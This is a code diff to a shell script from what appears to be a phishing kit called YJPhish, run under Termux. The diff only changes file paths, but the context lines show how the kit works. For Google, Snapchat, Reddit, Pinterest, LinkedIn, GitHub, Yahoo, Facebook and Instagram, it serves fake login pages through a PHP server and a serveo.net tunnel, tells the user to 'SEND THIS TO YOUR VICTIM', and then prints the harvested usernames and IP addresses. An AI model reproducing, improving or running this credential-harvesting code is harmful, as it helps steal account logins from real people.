@@ -49,8 +49,8 @@ php -S localhost:$port > /dev/null 2>&1  &
 echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
 echo -e "$blue [•]Wait for victim until he/she do login"$rset
 sleep 60.0 
-echo -e "" $cyan && cat google/usernames.txt 
-cat google/ip.txt
+echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/google/usernames.txt 
+cat /data/data/com.termux/files/home/YJPhish/sites/google/ip.txt
 fi
 cd $HOME
 cd YJPhish
@@ -66,8 +66,8 @@ php -S localhost:$port > /dev/null 2>&1  &
 echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
 echo -e "$blue [•]Wait for victim until he/she do login"$rset
 sleep 60.0
-echo -e "" $cyan && cat snapchat/usernames.txt
-cat snapchat/ip.txt
+echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/snapchat/usernames.txt
+cat /data/data/com.termux/files/home/YJPhish/sites/snapchat/ip.txt
 fi
 cd $HOME
 cd YJPhish
@@ -83,8 +83,8 @@ php -S localhost:$port > /dev/null 2>&1  &
 echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
 echo -e "$blue [•]Wait for victim until he/she do login"$rset
 sleep 60.0
-echo -e "" $cyan && cat reddit/usernames.txt
-cat reddit/ip.txt
+echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/reddit/usernames.txt
+cat /data/data/com.termux/files/home/YJPhish/sites/reddit/ip.txt
 fi
 cd $HOME
 cd YJPhish
@@ -100,8 +100,8 @@ php -S localhost:$port > /dev/null 2>&1  &
 echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
 echo -e "$blue [•]Wait for victim until he/she do login"$rset
 sleep 60.0
-echo -e "" $cyan && cat pinterest/usernames.txt
-cat pinterest/ip.txt
+echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/pinterest/usernames.txt
+cat /data/data/com.termux/files/home/YJPhish/sites/pinterest/ip.txt
 fi
 cd $HOME
 cd YJPhish
@@ -117,8 +117,8 @@ php -S localhost:$port > /dev/null 2>&1  &
 echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
 echo -e "$blue [•]Wait for victim until he/she do login"$rset
 sleep 60.0
-echo -e "" $cyan && cat linkedin/usernames.txt
-cat linkedin/ip.txt
+echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/linkedin/usernames.txt
+cat /data/data/com.termux/files/home/YJPhish/sites/linkedin/ip.txt
 fi
 cd $HOME
 cd YJPhish
@@ -134,8 +134,8 @@ php -S localhost:$port > /dev/null 2>&1  &
 echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
 echo -e "$blue [•]Wait for victim until he/she do login"$rset
 sleep 60.0
-echo -e "" $cyan && cat github/usernames.txt
-cat github/ip.txt
+echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/github/usernames.txt
+cat /data/data/com.termux/files/home/YJPhish/sites/github/ip.txt
 fi
 cd $HOME
 cd YJPhish
@@ -151,8 +151,8 @@ php -S localhost:$port > /dev/null 2>&1  &
 echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
 echo -e "$blue [•]Wait for victim until he/she do login"$rset
 sleep 60.0
-echo -e "" $cyan && cat yahoo/usernames.txt
-cat yahoo/ip.txt
+echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/yahoo/usernames.txt
+cat /data/data/com.termux/files/home/YJPhish/sites/yahoo/ip.txt
 fi
 cd $HOME
 cd YJPhish
@@ -168,8 +168,8 @@ php -S localhost:$port > /dev/null 2>&1  &
 echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
 echo -e "$blue [•]Wait for victim until he/she do login"$rset
 sleep 60.0
-echo -e "" $cyan && cat facebook/usernames.txt
-cat facebook/ip.txt
+echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/facebook/usernames.txt
+cat /data/data/com.termux/files/home/YJPhish/sites/facebook/ip.txt
 fi
 cd $HOME
 cd YJPhish
@@ -185,8 +185,8 @@ php -S localhost:$port > /dev/null 2>&1  &
 echo -e "$red [•]SEND THIS TO YOUR VICTIM=$rset http://serveo.net:$port/$postion/login.html"
 echo -e "$blue [•]Wait for victim until he/she do login"$rset
 sleep 60.0
-echo -e "" $cyan && cat instagram/usernames.txt
-cat instagram/ip.txt
+echo -e "" $cyan && cat /data/data/com.termux/files/home/YJPhish/sites/instagram/usernames.txt
+cat /data/data/com.termux/files/home/YJPhish/sites/instagram/ip.txt
 fi
 cd $HOME
 cd YJPhish
